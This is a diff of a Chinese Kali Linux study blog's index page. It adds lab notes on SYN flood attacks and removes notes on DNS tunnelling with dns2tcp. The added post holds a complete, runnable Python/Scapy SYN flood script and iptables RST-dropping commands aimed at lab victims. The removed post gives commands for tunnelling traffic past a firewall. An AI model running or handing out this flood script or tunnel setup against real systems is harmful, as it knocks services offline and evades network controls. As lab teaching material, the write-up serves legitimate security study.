@@ -240,6 +240,264 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B9%9D)%EF%BC%9ASyn-Flood/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B9%9D)%EF%BC%9ASyn-Flood/" itemprop="url">Kali Linux笔记(七十九)：Syn-Flood</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:23:36+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  727 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Syn-Flood"><a href="#1-Syn-Flood" class="headerlink" title="1. Syn-Flood"></a>1. Syn-Flood</h4><ul>
+<li>常伴随IP欺骗<ul>
+<li>真正的攻击目标</li>
+</ul>
+</li>
+<li>Scapy<ul>
+<li>i=IP()</li>
+<li>i.dst=1.1.1.1</li>
+<li>i.display()</li>
+<li>t=TCP()</li>
+<li>sr1(i/t,verbose=1,timeout=3)</li>
+<li>sr1(IP(dst=1.1.1.1)/TCP())</li>
+</ul>
+</li>
+<li>▲ 占去服务器最大的TCP连接方式，但不一定占满CPU和内存</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=bfd9JSNr7NJUic0IHqv65VC-xrfIKwhyJeMgH0_rUctPVl0m73_xJ4tzmrR40ED_h4X0BwsCM5cza5gkFnBavbFxdOXdydmorEOJqE9IoUegi5G9qwunLokN&file_name=/SYN-Flood.PNG" alt="Syn-Flood过程"></p>
+<h4 id="2-实验–准备"><a href="#2-实验–准备" class="headerlink" title="2. 实验–准备"></a>2. 实验–准备</h4><ul>
+<li>Kali（攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Metasploit（Linux被攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Window XP SP3（Winodws被轰击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-实验–Linux"><a href="#3-实验–Linux" class="headerlink" title="3. 实验–Linux"></a>3. 实验–Linux</h4><ul>
+<li>Metasploit（Linux被攻击者）<ul>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>查看开放的端口（TCP端口，<strong><code>🔺命令：netstat -pantu</code></strong>查看）</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li>Scapy<ul>
+<li>i=IP()</li>
+<li>i.dst=”Metasploit的IP”</li>
+<li>i.display()</li>
+<li>t=TCP()</li>
+<li>t.dport=22</li>
+<li>t.display()（查看发包是否flags=S）</li>
+<li>sr1(i/t,verbose=1,timeout=3)（查看回包是否flags=SA）</li>
+</ul>
+</li>
+<li>▲ sr1(IP(dst=”Metasploit的IP”)/TCP())</li>
+<li>开启Wireshark开启抓包，重新发送数据包（ip add eq Metasploit的IP），RST数据包会让被攻击者丢弃建立的SYN/ACK数据包</li>
+<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Metasploit的IP -j DROP</code></strong></li>
+<li><strong><code>🔺命令：iptables -L</code></strong>进行查看目标是否生效</li>
+<li>重新发送数据包（ip add eq Metasploit的IP），看是否出现RST数据包，会出现一个TCP Retransmission重传数据包</li>
+<li>先连接<strong><code>🔺命令：ssh msfadmin@Metasploit的IP</code></strong>，尝试连接速度是否延迟</li>
+<li>攻击脚本：<strong><code>🔺命令：./syn_flood.py Metasploit的IP 22 200</code></strong></li>
+<li>在攻击的同时开启Wireshark抓包查看数据包，并ssh登陆看是否能登陆</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./syn_flood.py [IP端口] [端口] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./syn_flood.py 1.1.1.1 80 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行SYN Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def synflood(target,port):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(synflood,(target,port))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Metasploit（Linux被攻击者）<ul>
+<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU和内存是否提高或者不变</li>
+<li>查看TCP连接：<strong><code>🔺命令：netstat -n | awk &#39;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&#39;</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="4-实验–Window"><a href="#4-实验–Window" class="headerlink" title="4. 实验–Window"></a>4. 实验–Window</h4><ul>
+<li>Window XP SP3（Winodws被攻击者）<ul>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>关闭防火墙</li>
+<li>开启远程桌面，设置administrator密码（空密码不允许登陆）</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li><strong><code>🔺命令：rdesktop</code></strong>尝试登陆，连接速度是否延迟</li>
+<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Window XP SP3的IP -j DROP</code></strong></li>
+<li><strong><code>🔺命令：iptables -L</code></strong>进行查看目标是否生效</li>
+<li>攻击脚本：<strong><code>🔺命令：./syn_flood.py Window XP SP3的IP 3389 10</code></strong></li>
+<li>在攻击的同时开启Wireshark抓包查看数据包，并rdesktop远程桌面登陆看是否能登陆</li>
+</ul>
+</li>
+<li>▲ Windows系统默认半开连接数10个</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AB)%EF%BC%9ATCP%E8%BF%9E%E6%8E%A5%E3%80%81IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2738,442 +2996,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B9%9D)%EF%BC%9ADNS%E9%9A%A7%E9%81%93--dns2tcp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B9%9D)%EF%BC%9ADNS%E9%9A%A7%E9%81%93--dns2tcp/" itemprop="url">Kali Linux笔记(六十九)：DNS隧道--dns2tcp</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-02T13:28:25+08:00">
-                2020-02-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2.2k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  9 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-DNS协议隧道"><a href="#1-DNS协议隧道" class="headerlink" title="1. DNS协议隧道"></a>1. DNS协议隧道</h4><ul>
-<li>防火墙禁止TCP出站访问流量<ul>
-<li>SSH隧道、端口转发全部失效</li>
-<li>使用基于UDP协议的隧道</li>
-<li>DNS的工作原理适合用于实现隧道</li>
-<li>▲ TCP53–域名服务的冗余更新，域名服务器之间的传输/UDP53–用于域名服务的查询</li>
-</ul>
-</li>
-<li>DNS工作原理<ul>
-<li>DNS隧道原理：注册受自己控制的DNS记录</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=df6dfoWRnl6G2UmIBwI1DQAj1O9AkrL-PrwjuIl49TgguC-eHxwJbxBnio39ldA6YBkIa6VaKeeuK0YoN_Oy2hzTizXSghyblCiZgHfTJGeFKE-_ndG_BiSytrC4YyoV&file_name=/DNS%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B.PNG" alt="DNS工作原理"></p>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=390f9zQJ65jpRw0-Te2ctB42Sr3SI_cBvz0IgxHPVLCVJOtbU_ozJfLgnVYCTc3Fig1AyhGkuzkz-GqdNyyhJZ8a8YA_QO5Man_q3YDfc-aj6KrXNAv_KNYAcXkSPVZG&file_name=/%E4%B8%A4%E7%A7%8DDNS%E6%9F%A5%E8%AF%A2.PNG" alt="两种DNS查询"></p>
-<h4 id="2-Dns2tcp"><a href="#2-Dns2tcp" class="headerlink" title="2. Dns2tcp"></a>2. Dns2tcp</h4><ul>
-<li>利用合法的DNS服务器实现DNS隧道</li>
-<li>C/S（dns2tcpc/dns2tcpd）结构</li>
-<li>通过TXT记录加密传输数据（A记录长度有限，前面最大为63个字节）</li>
-<li>隧道建立后保持连接</li>
-<li>默认记录生存时间TTL值为3秒，由查询的DNS服务器告诉缓存时间（缓存时间越长越好）</li>
-<li>域名记录长度是有限的</li>
-<li>安装<ul>
-<li><strong><code>🔺命令：apt-get install dns2tcp</code></strong></li>
-<li>Kali默认安装</li>
-</ul>
-</li>
-<li>资源访问<ul>
-<li>本地SSH资源</li>
-<li>远程http资源</li>
-<li>http代理（squid，<strong><code>🔺命令：apt-get install squid3</code></strong>）</li>
-<li>https代理</li>
-<li>隧道嵌套<ul>
-<li>基于SSH资源将</li>
-<li><strong><code>🔺命令：ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code></strong></li>
-<li>XP IE、Firefox使用嵌套的Socks代理上网</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-实验-1"><a href="#3-实验-1" class="headerlink" title="3. 实验-1"></a>3. 实验-1</h4><ul>
-<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>插入bodhi-3.2.0-64.iso光盘，安装到硬盘，修改网络为Host-only方式，检查网络</li>
-<li>查看网管（netstat -nr，看是否为mono网关）</li>
-<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
-<li>浏览器登陆mono，开启默认规则以便能上网，下载dns2tcp、wireshark、firefox，下载完成后关闭默认规则</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window Server 2003<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
-<li>主要区域、区域名称（lab.com）</li>
-</ul>
-</li>
-<li>NS记录指向Kali<ul>
-<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
-</ul>
-</li>
-<li>创建区域lab.com，指派二级域test.lab.com<ul>
-<li>lab.com → 右键 → 新建委派 → test → 添加（Kali的主机记录）→ 解析</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：sudo vi /etc/resolv.conf</code></strong> → 修改为Window Server 2003的IP地址</li>
-<li>nslookup<ul>
-<li><strong><code>🔺命令：set q=ns lab.com</code></strong>（查看是否为Window Server 2003的IP地址）</li>
-<li><strong><code>🔺命令：set q=ns test.lab.com</code></strong>（查看是否为kali.lab.com）</li>
-<li><strong><code>🔺命令：www.baoidu.com</code></strong>（看是否能解析为外网的IP地址）</li>
-<li><strong><code>🔺命令：www.taobao.com</code></strong>（看是否能解析为外网的IP地址）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>服务端配置文件<ul>
-<li><strong><code>🔺命令：vi /etc/dns2tcpd.conf</code></strong>（修改listen为0.0.0.0，domain为test.lab.com，增加resources：socks:127.0.0.1:22716,http:192.168.0.1:80,https:0.0.0.0:8087，key=pass123）</li>
-<li>.dns2tcprcd</li>
-<li>资源可以是其他地址</li>
-</ul>
-</li>
-<li>开启socks代理，如GoAgent；开启SSH服务（擦除以前所作操作）</li>
-<li>启动<ul>
-<li><strong><code>🔺命令：dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code></strong> </li>
-<li>-F：前端显示运行状态</li>
-<li>-d：dubug level 1-3</li>
-<li>-f：指定配置文件</li>
-</ul>
-</li>
-<li>开启抓包（Wireshark，只抓取dns的数据包）</li>
-</ul>
-</li>
-<li>Window Server 2003<ul>
-<li>装入抓包软件（ComView，可能需要替换exe文件）</li>
-<li>Rules → IP Addresses → Both（Kali的IP，mono防火墙的IP）</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>禁用mono防火墙的规则</li>
-<li>启动抓包工具（sudo wireshark，需要进行过滤数据包）</li>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</code></strong><ul>
-<li>-c：启动压缩，提高访问效率</li>
-<li>-k：设置的密码</li>
-<li>-d：dubug level 1-3</li>
-<li>-l：本地侦听端口，用于连接隧道</li>
-<li>-r：资源名称（ssh、socks、http、https）</li>
-<li>-z：使用的域名</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：ssh root@127.0.0.1 -p 2222</code></strong></li>
-</ul>
-</li>
-<li>bodhi抓包分析、Kali抓包分析、Window Server 2003抓包分析</li>
-<li>bodhi（http）<ul>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r http -z test.lab.com</code></strong></li>
-<li>浏览器访问127.0.0.1:2222，是否被重定向到192.168.1.1</li>
-</ul>
-</li>
-<li>bodhi（socks）<ul>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r socks -z test.lab.com</code></strong></li>
-<li>浏览器配置socks代理资源，访问Google尝试</li>
-</ul>
-</li>
-<li>bodhi（ssh，作网管模式）<ul>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</code></strong></li>
-<li><strong><code>🔺命令：ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code></strong></li>
-</ul>
-</li>
-<li>Window XP<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-<li>浏览器 → 工具（Internet选项）→ 连接 → 局域网设置 → 设置代理服务器（bodhi的7001端口）</li>
-<li>上网尝试 ▲ 2020.2.2 ssh隧道的网管模式存在Bug，能连接但无法上网</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>浏览器配置HTTP proxy的7001端口，进行上网尝试 ▲ 2020.2.2 ssh隧道的网管模式存在Bug，能连接但无法上网</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=2720LjHJaO47INdj6TXeelWejbR_dI3yBH46Hg2Ozb22486KrHCTSKwgX_DFC9zRNL2EOpEWSa4TLawlqqJQEyPhwDEC47cQrTCKXiRjscZGBGf6iXgOVSn6VZN1SXY&file_name=/%E6%BC%94%E7%A4%BA%E7%8E%AF%E5%A2%83-1.PNG" alt="实验-1"></p>
-<h4 id="4-实验-2"><a href="#4-实验-2" class="headerlink" title="4. 实验-2"></a>4. 实验-2</h4><ul>
-<li>FW限制只允许内网DNS服务器访问外网指定DNS服务器UDP53端口</li>
-<li>内网DNS服务器：安装DNS服务器，配置转发器到外网DNS服务器</li>
-<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window Server 2003（外网的DNS服务器）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）   </li>
-<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
-<li>主要区域、区域名称（lab.com）</li>
-</ul>
-</li>
-<li>NS记录指向Kali<ul>
-<li>右键lab.com空白区域 → 新建主机 → 名称（w2k3）、IP（2003的IP地址）</li>
-<li>本机的NS记录进行更新，指向w2k3.lab.com</li>
-<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
-</ul>
-</li>
-<li>创建区域lab.com，指派二级域test.lab.com<ul>
-<li>lab.com → 右键 → 新建委派 → test → 添加（kali的主机记录）→ 解析</li>
-<li>ping kali.lab.com查看是否能进行正常通信</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
-<li>nslookup解析新浪和百度的域名，查看是否能正常通信</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>服务端配置文件<ul>
-<li><strong><code>🔺命令：vi /etc/dns2tcpd.conf</code></strong>（修改listen为0.0.0.0，domain为test.lab.com，增加resources：http:127.0.0.1:3128，key=pass123）</li>
-<li>.dns2tcprcd</li>
-<li>资源可以是其他地址</li>
-</ul>
-</li>
-<li>开启SSH服务（擦除以前所作操作）</li>
-<li>启动<ul>
-<li><strong><code>🔺命令：dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code></strong> </li>
-<li>-F：前端显示运行状态</li>
-<li>-d：dubug level 1-3</li>
-<li>-f：指定配置文件</li>
-</ul>
-</li>
-<li>安装squid<ul>
-<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>插入bodhi-3.2.0-64.iso光盘，安装到硬盘，修改网络为Host-only方式，检查网络</li>
-<li>查看网管（netstat -nr，看是否为mono网关）</li>
-<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
-<li>浏览器登陆mono，开启默认规则以便能上网，下载dns2tcp、wireshark、firefox，下载完成后关闭默认规则</li>
-</ul>
-</li>
-<li>Window Server 2003（内网的DNS服务器）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 外网的DNS服务器（Window Server 2003）</li>
-</ul>
-</li>
-<li>登陆防火墙查看规则（源和目的：Single host or alias，设置目的IP为Window Server 2003的内网外网IP地址）</li>
-<li>nslookup解析新浪、百度的域名，查看是否能正常通信</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：service squid start</code></strong> </li>
-<li><strong><code>🔺命令：netstat -pantu</code></strong>（查看3128端口和22端口是否开放）</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：sudo vi /etc/resolv.conf</code></strong> → 修改为内网Window Server 2003的IP地址</li>
-<li><strong><code>🔺命令：dig -t ns lab.com</code></strong>（查看是否解析到w2k3.lab.com以及IP地址）</li>
-<li><strong><code>🔺命令：dig -t ns test.lab.com</code></strong>（查看是否正常解析） ▲ 2020.2.1 dig无法正常解析，但nslookup可以正常解析，最后也能正常上网</li>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 8080 -r http -z test.lab.com</code></strong><ul>
-<li>-c：启动压缩，提高访问效率</li>
-<li>-k：设置的密码</li>
-<li>-d：dubug level 1-3</li>
-<li>-l：本地侦听端口，用于连接隧道</li>
-<li>-r：资源名称（ssh、socks、http、https）</li>
-<li>-z：使用的域名</li>
-</ul>
-</li>
-<li>设置浏览器代理，HTTP proxy → 127.0.0.1:8080，进行网络访问尝试</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=17dbrDOgUNDGcNEIBHaxcVIidQTXdj5yOStqA38AAYCG89sUzNR4T8KHgRlskZb8NlP0HrJnnehjBYITFVC-2_BRco8TjpWhI1nKmbZcEpWO81aqBf3fVgECAIaxTA0&file_name=/%E6%BC%94%E7%A4%BA%E7%8E%AF%E5%A2%83-2.PNG" alt="实验-2"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3228,7 +3050,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">145</span>
+                  <span class="site-state-item-count">146</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3335,7 +3157,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">129.5k</span>
+    <span title="Site words total count">130.3k</span>
   
 </div>
 
